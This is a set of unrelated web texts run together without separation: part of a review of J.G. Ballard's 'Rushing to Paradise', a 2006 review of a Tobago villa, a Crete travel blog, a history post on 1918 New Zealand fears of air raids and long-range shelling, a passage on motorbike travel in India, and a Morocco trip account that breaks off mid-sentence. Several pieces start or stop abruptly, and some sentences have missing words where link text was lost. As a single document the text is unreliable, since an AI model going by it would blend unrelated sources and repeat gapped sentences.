<p>&#xa0;</p>   <p>But the sudden switch&#xa0;from environmental satire to feminist satire here isn&#x2019;t as jarring as the competing elements in <em>Kingdom</em> <em>Come</em> or Ballard&#x2019;s other later books.&#xa0; Perhaps it&#x2019;s because we&#x2019;re set up for this transition early on in <em>Rushing to Paradise</em>.&#xa0; After meeting Barbara for the first time, a curious Neil does some research on her.&#xa0; He discovers that in her youth she was a proper <em>medical</em> doctor but was disgraced in a scandal where she assisted some terminally ill patients with their (alleged) wish to die.&#xa0; Thus, Ballard establishes her as a chameleon of trendy causes &#x2013; voluntary euthanasia, environmentalism, feminism &#x2013; who happily drops one and adopts another whenever it suits her damaged state of mind.</p>   <p>&#xa0;</p>   <p>In fact, I found <em>Rushing to Paradise</em> a surprisingly enjoyable book, more enjoyable than the assumptions I mentioned&#xa0;at the start of this review had led me to believe.&#xa0; Nonetheless, the strongest part of it is the bleakly-amusing central section, which details the environmentalists&#x2019; hopeless attempts to build a Gaia-friendly Shangri-La on the atoll after the French have abandoned it.&#xa0; (After sinking the Greenpeace vessel Rainbow Warrior in <b>Auckland</b> harbour in 1985, and after deciding to run nuclear tests at Moruroa to pre-empt the signing of the Comprehensive Test Ban Treaty in 1996, those beastly French were definitely the environmental villains <em>du jour</em> when Ballard penned this novel.)&#xa0; He has a merry time skewering his characters for the gulf between their rhetoric and (the&#xa0;consequences of) their actions.&#xa0; For instance, the ship that carries them to the atoll causes an oil slick that destroys most of its birdlife.&#xa0; And the endangered animals that environmental groups around the world send to them, believing they&#x2019;ve turned the atoll into an ecological Noah&#x2019;s Ark, end up in their cooking pots as survival there becomes more desperate.</p>   <p>&#xa0;</p>   <p>Although his early novels like <em>The Drowned World</em> and <em>The Drought</em> dealt ostensibly with environmental disasters and were prescient of our modern fears about global warming, Ballard never seemed to have much truck with the environmental movement.&#xa0; Indeed, one or two of the pieces in his 1996 collection of non-fiction, <em>A User&#x2019;s Guide to the Millennium</em>, were published originally in motoring magazines and suggested he was even a bit of a petrol-head.&#xa0; However, I wouldn&#x2019;t go so far as the Spectator columnist Rod Liddle who, on the event of Ballard&#x2019;s death, declared that the writer had been a Conservative ().&#xa0; I know he did write once about &#x201c;the mysterious beauty of Margaret Thatcher&#x2026; the arch of her nostrils and the sheen on her lower lip&#x2026;&#x201d; but as this came from the pen of a man who&#x2019;d written in <em>Crash</em> about people being sexually aroused by car accidents, Mrs Thatcher would be ill-advised to take it as a compliment.&#xa0; Besides, in the 1990s, Ballard turned down the offer of a CBE, condemning the British honours system as &#x201c;a Ruritanian charade that helps prop up our top-heavy monarchy.&#x201d; &#xa0;Hardly the words of a man of the right.</p>   <p>&#xa0;</p>   <p>My feeling is that, rather than expressing Ballard&#x2019;s disdain for the environmental movement or for the feminist movement, <em>Rushing to Paradise</em> is merely a character study.&#xa0; It examines a megalomaniac who, as I&#x2019;ve said, uses causes such as environmentalism and feminism as tools to herd her followers closer and closer to her messianic goals.&#xa0; Indeed, Barbara is one of the most intriguing of Ballard&#x2019;s characters, managing to be a tyrant and mass-murderer but&#xa0;managing to engage the reader&#x2019;s pity too.&#xa0; In one of Neil&#x2019;s rare moments of insight, he glimpses the profound solitude that she really longs for, realising &#x201c;for the first time that she would only be happy when was alone on Saint Esprit, when Kino, Monique and the Saitos had gone and even the albatross had abandoned her.&#x201d;&#xa0; And her demented spirit seems to shine ever more brightly as people die around her and as her own body withers with malnutrition, illness and overwork.</p>   <p>&#xa0;</p>   <p>Correspondingly, if <em>Rushing to Paradise</em> has a fault, it lies in the characterisation of Neil.&#xa0; Possessing little spirit himself, easily manipulated and more than a little stupid, he seems to exist only as a literary device &#x2014; as&#xa0;a blank page for recording, and an empty mirror for reflecting, Barbara&#x2019;s glorious insanity. &#xa0;And unsurprisingly, at the book&#x2019;s finale, when he is rescued from the atoll, his one impulse is directed towards the mad but magnetic older woman who has dominated him for so long. &#xa0;Neil, writes Ballard, &#x201c;would join her, happy to be embraced again by Dr Barbara&#x2019;s cruel and generous heart.&#x201d;</p>   <p>&#xa0;</p>   <p>Indeed, his passivity becomes downright annoying. &#xa0;Reading the book, there were times when&#xa0;I wished that I could step into its pages,&#xa0;onto the sands of Saint Esprit, and throttle him &#x2014; or that Dr Barbara Rafferty would bump him off too and finish the job of rendering Saint Esprit&#x2019;s male population extinct.</p>   <p>&#xa0;</p>  </div>  
   <div>     <div>    <div>     By the week&#x2019;s end we had found our favorite areas in the house, identified preferred dining spots, tourist attractions and grocery stores nearby, and would gladly have remained another week.    </div>   </div>   <div>     <div>     <div>      <div>       <div>        <strong>Overall Impression</strong> Villa de Lena, like Tobago, was a journey of discovery. We began the journey as curious visitors and ended it as friends. The two story $1.2 million villa occupied 374 square meters. It was well situated in a residential district near the tourist areas on the western end of Tobago. This meant our street was quiet with little traffic. At the same time we were within a five to 10 minute drive to the airport, tourist attractions, the Store Bay market and food stalls, restaurants, hotels, souvenir shops and tourist activities such as diving and water sports.        <p>The Villa was homey, spacious and designed for comfort and with island &#xe9;lan. It was a pleasant place to spend time when we felt like relaxing in between activities and discovering Tobago. The house had many doors. Opening them allowed the sea breezes in, cooling the areas downstairs (only the bedrooms were air conditioned). Each of the doors and many windows had wrought <b>iron</b> <b>gates</b> with individual locks. It took some effort initially to open and close all the doors and wrought <b>iron</b> <b>gates</b> around the house every time we went out or arrived back. By the end of the week, we had integrated those tasks into our routine and performed them easily. Although we were bitten fiercely by mosquitoes and no-see-ums in many other parts of Tobago, Villa de Lena was blissfully mosquito free during our stay.</p>        <p>Prior to our arrival on the island our interaction with Trinidad and Tobago native and villa owner Mervyn Sifontes was positive and informative. Every time we exchanged emails or spoke on the phone he was gracious and responded to our questions with patience and genuine warmth. The day after we arrived and during out stay, he called from Sweden to make sure we had everything we needed.</p>        <p>Having Internet access and satellite television was wonderful. This allowed us to check urgent messages and find out the latest news. At the same time, since the Internet service was via dial-up there was little temptation to stay online for anything but the most urgent issues. We enjoyed our stay in Villa de Lena which lent itself to poolside and indoor relaxation, providing many of the comforts of home and ample space for families of two or more to vacation together. The Villa&#x2019;s convenient central location was practical while its attractive design and clean white interior made it appealing. By the week&#x2019;s end we had found our favorite areas in the house, identified preferred dining spots, tourist attractions and grocery stores nearby, and would gladly have remained another week.</p>       </div>       <div>        <strong>Class Of Accommodation</strong> Private luxury villa        <p><strong>Connectivity</strong> There was access to the Internet via a dial-up connection on the owner&#x2019;s computer. Although it was much slower than high speed Internet access, it was good enough to check urgent messages during our time away.</p>        <p><strong>Handicapped Access</strong> A spiral tiled staircase lead to the second floor sleeping area.</p>        <p><strong>Length Of Stay</strong> One week</p>        <p><strong>Location</strong> Bon Accord district near Crown Point on the western end of Tobago </p>        <p><strong>Owned-Managed</strong> Mervyn and Lena Sifontes</p>        <p><strong>Pets Allowed</strong> No</p>        <p><strong>Size</strong> The villa had a total area of 374 square meters (approximately 3,700 square feet) and the property sat on an acre of land. The ground floor covered approximately 224 square meters and the upper floor 150 square meters. Three were three bedrooms and two and a half bathrooms on the property.</p>        <p><strong>Year Opened</strong> In 2003</p>       </div>       <div>        <strong>Common Areas</strong> The property was surrounded by a six foot white concrete wall facing the road on one side and a tall chain link fence circled the remaining side and back. Landscape gardens surrounded the house serving as home to many birds. The main entrance to Villa de Lena was next to a porte coch&#xe8;re on the side of the villa, a short drive from the entrance        <b>gates</b>. The floor for the entire house was of 12 inch (18 in the master bedroom) white ceramic tile. The housekeeper requested we take our shoes off while in the house. There was a rack near the front door where we left our shoes. The floor inside the house was clean enough to walk barefoot.        <p>Caribbean sunlight filtered through windows and doors immersing the house in warm light through most of the day. Indoor wrought <b>iron</b> <b>gates</b> covered almost all the windows and doors. There were live (and artificial) plants peppered through the downstairs rooms. There were also fans in several of the downstairs areas including the TV room, and office dining and living rooms. Oil paintings, from Israeli, Russian and Swedish artists, hung on the walls.</p>        <p>To the right of the entrance there was a small television room housing a brown leatherette set comprising a sofa and two swivel armchairs. There was also a glass covered wood table and a 36 inch satellite TV with 50 channel options. To the left there was a 100 square foot office facing the front yard. It had a desk, office chair with wheels, book shelf, phone, fax machine, printer and Dell computer and monitor. There was a half bathroom (toilet and sink) across from the television area.</p>        <p>The soul of the house was situated in a large room, with an extra tall ceiling, at the end of the entrance hallway. Its most salient feature was a spiral staircase leading to the second story sleeping area. The room also connected to a covered garage at the foot of the staircase. To the left there was a large open kitchen and laundry room. A long wood countertop with six stools for quick meals and snacks separated the kitchen and staircase rooms. A formal dining area was next in a rounded space facing the front yard. It was home to a wood and cloth dining set for six with spare chairs. There was also a cabinet on one side and windows on three sides. To the other side there was a living area with similar furniture to the one in the TV room and a CD player. A step from there was the pool area and beyond it an oversized gazebo and back yard.</p>        <p>The second story was occupied by the sleeping quarters. There was a master suite with its own bathroom and two additional bedrooms which shared a small bathroom. Also on the second floor there was an open terrace with lounge chairs facing the backyard.</p>        <p><strong>D&#xc9;Cor</strong> The house was decorated mostly in white. The comfortable furniture was imported from Italian and Scandinavian. The d&#xe9;cor was a blend of casual European and Trinidad and Tobago styling. Trinidad architect John Yearwood, from the firm Archisis, designed Villa de Lena to be identical to another home in Trinidad.</p>       </div>       <div>        <strong>Bathroom</strong> A door led to a rectangular well lit bathroom. Double sinks faced a large mirrored wall. White curtained windows ran two thirds of the length of the bathroom. Toward the back of the bathroom there was a toilet, bathtub and shower.        <p><strong>Rooms</strong> Our 600-square foot air conditioned master suite was on the upper floor at the top of the spiral staircase. It had an en-suite bathroom, walk-in closet with safe and small open terrace facing the front garden and Bon Accord Estate Road beyond the property wall. A window facing queen bed with a brick red flower patterned bedspread occupied the center of the room. A remote controlled air conditioning wall unit kept the suite fresh allowing us a cool night&#x2019;s rest. There were glass and metal night tables and lamps on either side of the bed. A wood dresser and rectangular mirror sat in a corner. Double curtains hung over the terrace doors, one curtain was white and the other navy blue. A chandelier style lamp hung in the center. A glass brick wall divided the walk-in closet and the room; a smaller glass brick wall stood between the shower in the bathroom and the room.</p>       </div>       <div>        <strong>Amenities</strong> There were plenty of linens (some sheets were a bit aged), including pool towels, crockery, cutlery, glassware, safety box.        <p><strong>Pool</strong> The pool was set on a terraced area to the side of the house opposite the porte coch&#xe8;re. It housed several lounge chairs and two umbrellas to provide shade from the sun. There was a covered dining area to one side near the pool. There was also a 100 square meter gazebo ideal for receptions on the edge of property. It had a wet bar and hot plate, dining and sitting areas.</p>        <p>The pool itself sloped at steep angles from the edges toward the middle. It was 4 x 8 meters in size and approximately 1.85 meters deep. The owner explained that the architect felt that such a design matched the unique house plan. At the same time, the owners feel the slopes accommodate none swimmers and kids. There was an outdoor shower allowing guests to rinse off before entering the very clean pool.</p>       </div>       <div>        <strong>Other</strong> The owner&#x2019;s motto for Villa de Lena was &#x201c;Come as a stranger and leave as a friend.&#x201d; The Villa was well lit at night with interior and exterior lights throughout. Locking the wrought        <b>iron</b>        <b>gates</b> around the house required multiple keys. This meant we had to plan extra time when we went out to lock all the doors and        <b>gates</b> with the single set of keys we received from the housekeeper.        <p>To reach Villa de Lena we had to drive down a gravel road being extra careful with our rental car because there were many potholes on the road making it a bumpy drive. Some taxis and one of the tour guides wouldn&#x2019;t drive down the gravel road.</p>        <p>Although there were phones throughout the house, phone access was for incoming calls only. The night before our departure, while we were discussing last minute flight changes our airline had made to our flights, our prepaid local mobile phone ran out of time. Although we had charged the phone to last us until our departure, the flight change required much more time than we would have expected. It was impossible to call the airline (or the car rental company) back from the house so we had to rush into town in the rain to find a mobile phone recharge before the airline offices closed for the day. Next time we will purchase extra mobile phone time.</p>        <p>The Villa website was convenient allowing us to glimpse available dates months in advance.</p>        <p>Villa de Lena was surrounded by bougainvilleas, exhoras, frangipani, croton, ginger lilies, oleanders, buttercups, queen of flower, periwinkle, bell flower, palms and silver tree. There were also mangoes, grapefruit, avocados, sour sop, papaya, coconut, ponga nut and golden apple trees on the property.</p>       </div>       <div>        <strong>Cleanliness</strong> Excellent.        <p><strong>Date Of Review</strong> August 2006</p>        <p><strong>Reviewers</strong>Article by </p>        <p>Photos by </p>        <p><strong>Service</strong> Velma the housekeeper looked after the Villa.

   <div>   <p>Ah, Crete. I hadn&#x2019;t exactly planned on going there, but after travelling through the Middle East I was in need of a holiday. I was thinking about maybe going to Ios, but I&#x2019;d heard good things about Crete, and it has history for New Zealanders. It is pretty much a package holiday place though &#x2013; something like 80% of visitors are on package tours. Still, I was in the mood for somewhere where I could drink the water out of the tap, and flush the toilet. I guess I mostly succeeded in that (those who have used Greek toilets will know what I mean).</p>   <p>This is the view out the window of the place I was staying at. Not that cheap, but right in the middle of it. Restaurants immediately below the window, and the water right there. Plenty of bars within 1-2 mins walk.</p>   <p>Some other shots, one looking over the old town, the next looking back across the harbour. The place I was staying at is roughly in the middle.</p>   <p>Since lying on a beach all day, and drinking all night wasn&#x2019;t going to do my body any favours, I decided to walk the </p>   <p>Souda (also spelt Suda) Bay is the Commonwealth WWII cemetery on Crete. There&#x2019;s around 1500 servicemen buried here, including around 500 New Zealanders. Something that really struck me here was the large number of unidentified soldiers &#x2013; I guess that came from the fact that the bodies were moved around several times, having first been buried around the island when the Germans took it. I was there just a few days after a ceremony commemorating the 65th anniversary of the battle of Crete, so wreaths were still around.</p>   <p>I wanted to go somewhere with working municipal facilities, and for the most part, they were. However I did particularly like this pedestrian crossing &#x2013; after crossing from right to left, where are you meant to go? There&#x2019;s no footpath, it just goes straight into a fence.</p>   <p>And of course, here&#x2019;s the main reason I enjoyed myself so much on Crete &#x2013; this is Linda and Pia, who work at DNA. Huge amounts of fun, just don&#x2019;t try and outdrink them, you will regret it&#x2026;</p>  </div>  
   <div>   <p>For a country so far from the frontline, there was a surprising amount of discussion in the New Zealand press in the autumn of 1918 about the possibility of Auckland being bombed or Wellington being shelled. It's true that it was often framed in a joking fashion, as with the above cartoon which appeared in the <em>New Zealand Observer</em> on 4 May with the caption 'IF A BOMB FELL ON ONE OF OURS?' showing the reactions of an amusingly confused congregation as the war intrudes into their Sunday devotions. But despite the humour, there's an undercurrent of fear, and also perhaps, strangely, of desire. So, according to the <em>Observer</em>'s 'They Say' column on 30 March, one of the things they were saying was</p>   <blockquote>    <p>That is is possible that a raider will visit New Zealand, let loose an air plane, and drop bombs on Auckland City. If one should drop on ? Good-bye New Zealand.</p>   </blockquote>   <p>Laidlaw Leeds was a big Auckland department store (now better known as Farmers); obviously it's an exaggeration to suggest that blowing it up would be an irretrievable disaster for the country as a whole. It's just part of the sarcastic and cynical style of the columnist. A few days later, a similar column in the <em>New Zealand Free Lance</em> (quite possibly inspired by the <em>Observer</em>, its sister paper) suggested that 'town talk' had it</p>   <blockquote>    <p>That if a Hun air-raider should visit this fair Dominion and drop bombs on some of our 'indispensables' it would be 'Good-bye, New Zealand.'</p>   </blockquote>   <p>The 'indispensables' here would be men deemed too essential for the war effort to be conscripted. What's significant about these jokes is that the idea of German raiders launching aeroplanes to bomb New Zealand cities had some currency, otherwise there would be no point to them. Another 'They Say' comment in the <em>Observer</em> a couple of weeks later made the connection to the mystery aeroplanes scare explicitly:</p>   <blockquote>    <p>Thousands of New Zealanders have seen hostile aircraft in New Zealand air lately. It is sincerely hoped they will not drop bombs on any 'indispensables,' or even on Appeal Boards.</p>   </blockquote>   <p>How far this claim of 'Thousands of New Zealanders' seeing mystery aeroplanes can be trusted is unclear. Again, the jocular tone of the column means it can't be taken at face value, as another relevant entry from the same issue shows:</p>   <blockquote>    <p>Owing to the reported presence in New Zealand of hostile skycraft hairdressers are secretly planning punitive hair raids.</p>   </blockquote>   <p>Presumably, hairdressers were doing no such thing! But it seems likely that, at the very least, 'Thousands' can be read as indicating that many more mystery aeroplane sightings took place than were otherwise reported in the press.</p>   <p>It wasn't just about aeroplanes, however. Recall the who was worried about bombs dropped from seaplanes as well as:</p>   <blockquote>    <p>[...] these big guns firing 100 miles. What's to stop a raider coming in behind Rangitoto with one of these guns and firing a shell into our houses in Grafton Road?</p>   </blockquote>   <p>This is a clear reference to the , a German supergun which fired over three hundred 9-inch shells at Paris from a distance of 120 km, beginning with the opening of the on 21 March. Unlike (which also raided the city during this period), the Paris Gun gave no warning: the shells could land anywhere at anytime. They killed 256 civilians in total, 88 alone when a shell hit the church of on Good Friday -- an incident prominently reported in the New Zealand press. This deadly, surprising, and above all long-range attack on Parisian churchgoers seems to have struck a nerve on the far side of the world, and was conflated with the concurrent fears of a attack on New Zealand by a raider. For example, the caption of the cartoon at the top of this post actually read in full:</p>   <blockquote>    <p>IF A BOMB FELL ON ONE OF OURS?</p>    <p>Parson (reading war news). So a shell from the Hun long-distance gun fell onto a church and killed and wounded hundreds of people? 'Um, safer here.</p>   </blockquote>   <p>There are several things going on here. One is a commentary on the lack of churchgoing in New Zealand, as yet another 'They Say' item from 30 March makes clear:</p>   <blockquote>    <p>The remarkable thing about the German shelling of Paris is that when the shells hit churches they invariably injure someone. Now if a shell were to fall on a New Zealand church ---</p>   </blockquote>   <p>Another is the obvious one, the simple act of imagining New Zealand under fire. And I think that yet another is the confusion of the congregation, who are surprised and don't know how to interpret the explosion: 'Did you speak?', 'Sit down Billy!', 'Good day'. That is to say, that New Zealanders, so remote and safe from the fighting, don't know what war really is. </p>   <p>This is where desire comes in. Early on in the mystery aeroplane scare, the <em>Observer</em> published a letter from a wounded New Zealand soldier who had been in London during an air raid. He suggested that</p>   <blockquote>    <p>Except for the unfortunate few who are killed, I think it is a good thing there is a raid now and again. It lets some of these headed [sic] 'peace at any price people' in the House of Commons see that there is really a war on, and it would do both Australia and New Zealand a lot of good, too, to get either a good raid or a bombardment on to some of their main cities. It might shake some of those blighters up who are hanging back, and probably -- having had a taste of what the gentle Hun is really capable of doing -- they would perhaps have a little more real fellow-feeling for the maimed and wounded who are lucky enough to get back to their native shores, after being under the iron flail for months -- perhaps for years.</p>   </blockquote>   <p>This was exactly the same discourse that was evident across the Tasman at the same time: that it would do Australians some good to have some bombs dropped on them. While this didn't happen, both Australians and New Zealanders did start , by seeing hostile aircraft in the skies.</p>   <p>Interestingly, a leading article in the <em>Observer</em> on 6 April seemed to suggest that the scare over mystery aeroplanes, German raiders and Paris Guns was not about dreaming this war, but rather was about dreaming the <em>next</em> war, apparently with Japan:</p>   <blockquote>    <p>There are local signs from people who have never seen war, and have never lived on a frontier with shells of war, that they have It is to be remembered that we are many thousands of miles from the gun that is set up to kill Parisians, and that there is no credit in being either optimistic or courageous so far away. But to those people who are getting 'the wind up' one would say, as one has said so many times before, that New Zealand its very self will sooner or later become the same sort of a cockpit as Belgium, and that the courage of civilian New Zealanders will enhance in the same proportion as her danger increases. It is said by those who understand the signs that the Pacific will yet become the battle ground (or sea) for humanity.</p>   </blockquote>   <p>There follow references to a recent controversy over the future status of Samoa, leading to the question of whether the sort of person who 'only shoots off his mouth' about war will 'shed his own blood for New Zealand when New Zealand is a frontier, and the enemy is battering at its gates? -- not the gates of Paris, but of Wellington and Auckland'. The aerial threat appears in the next paragraph:</p>   <blockquote>    <p>People living on frontiers always expect war, and insular people always affect to believe that islands are impregnable. There is no impregnability anywhere, for the rapidly developing sky battle machine has altered all that, and the enemy has even invaded England, if persistent air raids can be called invasion. What is possible in the method of attack on England is also possible as far as little New Zealand is concerned. Every ounce of war effort made by New Zealand has, of course, been in the direction of sending men out of the country, and not in preparation for the defence of this country -- a defence, by the way, that will have to be naval. In the future the discipline of the people will have to be of a sterner kind if New Zealand is to be held by New Zealanders, and by every known means the State should instil into the people a knowledge of the possibilities. Everyone should be told in the plainest terms that New Zealand is not to be immune from war. When her time of trial comes may New Zealanders, with the philosophy of Jean, say, 'C'Est la guerre!'</p>   </blockquote>   <p>The leading article ended by predicting that </p>   <blockquote>    <p>New Zealanders will have to grit their teeth harder and make a better do of it if the country is to remain British, and look forward to a day when, with shells falling in , the citizens calmly exclaim, 'Why worry -- &quot;C'Est la guerre!&quot;'</p>   </blockquote>   <p>Did New Zealanders really have the wind up? After all, only a handful of mystery aeroplane sightings had been . And nearly everything discussed in this post is either couched in humorous terms, and is from the one newspaper. So it could be a bit of a beat-up. Indeed, after late April, even the sorts of half-joking reports of mystery aeroplanes I discussed disappeared. </p>   <p>But only for a while. In the next post in this series I'll examine the re-emergence of the scare at the end of May 1918. And finally I'll look at the evidence for the government's response to the mystery aeroplanes.</p>   <div>    <div>     <h3>Possibly-related posts:</h3>    </div>   </div>   <ol>    <li><p><em>New Zealand Observer</em> (Auckland), 4 May 1918, .&#xa0;</p></li>    <li><p>Ibid., 30 March 1918, .&#xa0;</p></li>    <li><p><em>New Zealand Free Lance</em> (Wellington), 4 April 1918, .&#xa0;</p></li>    <li><p><em>New Zealand Observer</em>, 13 April 1918, .&#xa0;</p></li>    <li><p>Ibid.&#xa0;</p></li>    <li><p>Ibid., 20 April 1918, .&#xa0;</p></li>    <li><p>E.g. <em>New Zealand Herald</em> (Auckland), 1 April 1918, .&#xa0;</p></li>    <li><p>Compare another item from the 'They Say' column about how Aucklanders wouldn't mind something like a Paris Gun to hit Parliament House with: <em>New Zealand Observer</em>, 30 March 1918, 7.&#xa0;</p></li>    <li><p>Ibid., 4 May 1918, 5.&#xa0;</p></li>    <li><p>Ibid., 30 March 1918, 7.&#xa0;</p></li>    <li><p>Ibid., 16 March 1918, .&#xa0;</p></li>    <li><p>Ibid., 6 April 1918, .&#xa0;</p></li>    <li><p>Ibid.&#xa0;</p></li>    <li><p>Ibid.&#xa0;</p></li>    <li><p>Ibid.&#xa0;</p></li>   </ol>    <p> This work is licensed under a .

   <div>   <p>I had heard all the stories of buses on their backs like beetles at the bottom of ravines and head on collisions between lorry and scooter.

We wound our way further and further into the wilderness and up the mountains and the sun bathed the surrounding jungle in its final orange glow. Soon there was nothing but the cold air and the moon peering through cotton clouds, the odd home glowing in the twilight.

A small industrial town in the middle of the jungle with not much to offer the odd passing tourist, it was unapologetically itself. Great Banyan trees lined the central roads, an old car sat beneath them, left to the weeds.

We spent a week in Gokarna, swimming in the cool water in a hashish haze and lying under the stars, the night humming with voices and the sound of drums.</p>   <div>    <p>(Gokarna &#xa9; Isabella Thompson)</p>   </div>   <p>As Christmas approached and our month on the bike drew to an end, we decided to spend our final few days in southern Goa. After spending Christmas Eve on Patnem beach full of people and exploding boxes of fireworks, we searched for somewhere more removed for Christmas day and stumbled upon Galgibaga beach.</p>   <p>The expanse of white sand was almost completely empty, bordered by tall pine trees and rolling hills along the coastline beyond. When we got too hot from lying in the sun, we wandered through pine shade and came across the hammocks and colourful plastic tables of a restaurant. The afternoon was spent swinging in the trees, drinking juice and reading books. At sunset, we sat on the empty beach and watched a dolphin pirouette in front of the sinking pink sun. We couldn&#x2019;t have imagined a more perfect Christmas. It happened because we had the freedom of the bike to wander twenty minutes down the coast.</p>   <div>    <p>(Sunset on Christmas day, Galgibaga beach &#xa9; Isabella Thompson)</p>   </div>   <p>By the end of our month, that magnificent chrome beetle had become part of our journey and we were both sad to see her go. Our second month in India was very different to our first.</p>   <p>We still found ourselves wide-eyed in awe at the beauty of it all; the rippling green canals of the Kerala backwaters, a handful of shimmering feathers from the Mysore Avery, a boy balancing on the train tracks holding his friends&#x2019; shoulders.</p>   <div>    <p>(Feeding the monkeys at the Hanuman Temple, Hampi &#xa9; Isabella Thompson)</p>   </div>   <p>However, we had hugely underestimated the preparation that needed to go into organising our travel after the freedom of the bike.

From big tourist location to the next, the majority of the people we met were impersonal and uninterested in comparison to most of the people we met in the rural areas we visited on the Enfield.&#xa0;From the half-hearted touts in the shade of their shops along Varkala clifftop to the Babas of Varanasi, their legitimacy hidden in great clouds of chillum smoke, it felt like the locals of traveller destinations were most interested in what lined our pockets.</p>   <p>So although we always ended those long days exhausted, shaky and covered in dirt, and we were driven off the road several times, travelling by bike through India was a far less stressful experience than using the public transport.</p>   <p>It was also a more freeing one, simply watching the landscape change as the hours passed, the sun on our necks and the warm wind in our faces.</p>  </div>  
   <div>   <div>    <h1>Traveling From Fez Morocco to Marrakesh&#x2014;The Long Way: Day One</h1>   </div>   <div>    <p>We planned to spend the majority of our time in Morocco exploring a number of the country&#x2019;s cities: Tetouan, Tangier, Fez, Marrakesh and even a few hours in Casablanca.

We decided on a four day trip, beginning in Fez and ending in Marrakesh during which we hoped to:</p>    <ul>     <li>See and learn the histories of the historic cities of Meknes and Volubilis;</li>     <li>Travel to the southern part of the country to &#x201c;experience&#x201d; Berber Country&#x201d; and the desert with a night in a Berber tent (although we decided that we have already taken more than enough camel rides to last the rest of our lives); and</li>     <li>See the sights and get a chance to explore the beauty of the country&#x2019;s mountains, deep gorges, small mountain town Kasbahs and tiny villages of both the Mid Atlas and High Atlas mountains.</li>    </ul>    <p>Since there are no trains through this region, and we didn&#x2019;t want to drive, we decided to invest in a car, driver and guide to take us through a customized itinerary based on a trip offered by . We were driven by , a very personable guide who speaks very good English and who always went out of his way to make sure we got the experience that we wanted.</p>    <p>The next few posts detail our stops and experiences.</p>    <p><b>Volubilis</b></p>    <p>Volubilis, which was originally settled in the 3<sup>rd</sup> century BC, is a 42 hectare site that originally housed about 15,000 people. It was annexed by and adopted as one of the most important regional capitals by the Romans in 45 AD. Over the next three centuries (prior to Rome&#x2019;s withdrawal) a forum and many grand public buildings and residences were constructed. Although only a portion of the site has yet been excavated, it is still more than worth exploring (especially for the mosaics) and when combined with a trip to Meknes (see below). Among the sites we found most interesting were the:</p>    <ul>     <li>The 26-foot tall Triumphal Arch and the Basilica, which have been restored to provide a close representation of what they looked like in Roman times. The arch, which unfortunately, lacks its original carved frieze and especially the chariot with six horses that graced the top, was dedicated to the Emperor and his mother for granting citizenship to the city&#x2019;s residents, and especially for exempting them from taxes. The Basicila, which was the meeting place for the city&#x2019;s rulers, is next to the forum (the public square) with its patio lined with sculptures of important Romans (the statues which have been found and reconstructed are now in museums).</li>    </ul>    <ul>     <li>A number of large patrician villas, where we could still see the outlines of rooms, courtyards and pools in which they collected rainwater. Best of all, many of them have wonderfully restored mosaics on their floors. Among the best examples are in the House of the Bathing Nymphs, House of the Labors of Hercules, House of the Knights, House of the Columns and House of Dionysus and the Four Seasons.</li>    </ul>    <p>Many tell stories, such as a detailing of Hercules&#x2019;s 12 labors, one of nymphs seeking to catch a glimpse of the bathing Diana, and a humorous portrayal of a champion horse rider riding a donkey backwards.</p>    <ul>     <li>Gordian Palace, the Capitol and the House of Columns for their remaining Doric, Ionic and Corinthian columns, including a selection of Corinthian columns with some straight, some fluted and others spiral.</li>     <li>Remains of aqueducts, public fountain, public latrine (which, we were told, had marble seats which patricians had slaves warm for their use) and the rest of the underground plumbing system that used lead pipes to bring water directly to the homes of the patricians;</li>    </ul>    <p>There are also foundations of homes from plebeian settlements and a museum (not yet open) that has a display of capital columns from the site.</p>    <p>Since only about one-third of the site had yet been excavated, many evidences of this early city remain to be found. Archaeologists, for example, know there must be a coliseum, but have so far found no traces. And with most excavation now being done by vacationing students, it will take a while before experts can gain a full picture of the city.</p>    <p><b>Moulay Idress</b></p>    <p>After leaving Meknes, we make a short stop at Moulay Idress, where we made our way through a food market walk to the Moulay Idress Shine of which non-Muslims can take pictures from the outside, but not enter. This moderate descendent of Mohamad, who many thought should be the successor to the prophet, was forced out in a power struggle and settled in Morocco, where he was accepted as Emir, before being assassinated.</p>    <p><b>Meknes</b></p>    <p>Then we were on to Meknes, which spent most of its early years (until the 17<sup>th</sup> century) as a small town of no note. Its fate changed dramatically when Moulay Ismail, the first Alaouite sultan, chose Meknes as his Imperial City and wasted little time or money in creating a city the fit its new status. And since he was a champion of dramatic Moorish architecture, in creating the Imperial City section of the now large city of Meknes.</p>    <p>The Imperial City is entered from the medina through Bab Mansour el-Aleuj, a tall, 52-foot gate that was built in 1672 and is supposed to be one of the most dramatic and have some of the most beautiful tile and mosaic decorations in Morocco.</p>    <p>The Kasbah, the fortress that protects the imperial city, has a double set of walls that surround wide avenues and large plazas that are occupied by gardened grand palaces and large administrative buildings. It is divided into three complexes, with Dar el-Kebira and Dar el-Makhzen being of the greatest interest.</p>    <p>Dar el-Kebira, a complex that Ismail had built for himself, contained dozens of rooms that were linked via a tangle of alleys, is now in relative shambles and the remains have been divided into shanties. It is entered through a large plaza that contains some interesting souks, especially the interesting spice, olive and date souks. Beyond that is a long street containing a medina beginning with a large selection of clothing, shoes and toys, followed by food and then fabrics, before it gradually peters out into homes and shops.</p>    <p>The remnants are Ismail&#x2019;s mausoleum, a mosque, a pavilion and a large gate marking the complex&#x2019;s entrance:</p>    <ul>     <li>The mausoleum of Moulay Ismail, a three-room suite built in the 17<sup>th</sup> century for Ismail, his wife and his son with burial chamber, a carved and painted door, a star-shaped fountain and all decorated with Zellij tiles.</li>     <li>The mosque (Lalla Aoida), built in the late 17<sup>th</sup> century;</li>     <li>The pavilion (Koubba el-Khayatine) originally used to receive diplomats (seeking to pay ransoms to win the freedom of Christians) and especially the vast complex of underground dungeons in which Christians and other political prisoners were held and tortured.</li>    </ul>    <p>The district also had its own Jewish quarter. While the Jews have left, there is still a Jewish cemetery and a school and synagogue that used to educate students from all across northern Africa.</p>    <p>Dar el-Makhzen, which is dominated by a monumental gate (Bar el-Makhzen), is divided into eight parts&#x2014;each of them is of massive scale. A few of these are accessible to the public, including</p>    <ul>     <li>Water storage basin that collected water from aqueducts to irrigate the gardens and supply water for the residents;</li>     <li>Water House with 15 barrel-vault-roofed rooms with horse-driven water wheels to pull water from underground;</li>     <li>Grain stables which, before its roof collapsed in the 1755 earthquake, were temperature controlled to keep the grain from spoiling.</li>    </ul>    <p>We then had a huge, good three-course lunch (not by choice, but it seems that meals tend to be multi-course) at Restaurant Salma, beginning with bread, olives, white beans, lentils and eggplant. Joyce had the Western menu, beginning with an omelet, then some good lamb kefta with rice and French fries, and finishing with cr&#xe8;me caramel. Tom had the Moroccan lunch, beginning with a Moroccan salad (tomato and cucumber salad, marinated carrots and more eggplant), pigeon pastille (one of the better 